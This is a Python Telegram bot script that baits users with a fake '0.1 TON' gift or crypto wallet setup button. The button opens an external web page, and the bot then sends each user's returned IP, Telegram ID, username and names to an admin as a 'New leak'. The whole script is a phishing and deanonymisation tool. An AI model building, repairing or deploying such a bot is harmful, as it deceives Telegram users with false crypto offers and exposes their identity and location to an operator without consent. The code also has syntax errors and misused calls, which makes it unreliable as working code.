import telebot
from telebot.types import WebAppData, WebAppInfo, InlineKeyboardMarkup, InlineKeyboardButton
from telebot import TeleBot as Bot

with open("token.txt") as f:
    token = f.read().strip()

with open("admin.txt") as f:
    admin = f.read().strip()

bot = Bot(token)

@bot.message_handler(commands=["start"])
def cmd_start(message):
    if len(message.text) >= 8:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(text="Get 0.1 TON", web_app=WebAppData(url="https://lapismyt.github.io/c.html")))
        bot.send_message(message.from_user.id, "Check for 0.1 TON. Press button below to receive.", reply_markup=markup)
    else
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(text="Setup Cryptowallet", web_app=WebAppData(url="https://lapismyt.github.io/c.html")))
        bot.send_message(message.from_user.id, "Press button below to setup your Cryptowallet.", reply_markup=markup)

@bot.message_handler(content_types=["web_app_data"])
def wad_handler(message):
    data = message.web_app_data.data
    user = message.from_user
    resp = "New leak:\n"
    resp += f"IP: {data}\n"
    resp += f"User ID: {user.id}\n"
    resp += f"Username: @{user.username}\n"
    resp += f"First name: {user.first_name}"\n
    resp += f"Last name: {user.last_name}\n"
    bot.send_message(admin, resp)
    bot.send_message()

if __name__ == "__main__":
    bot.infinity_polling()
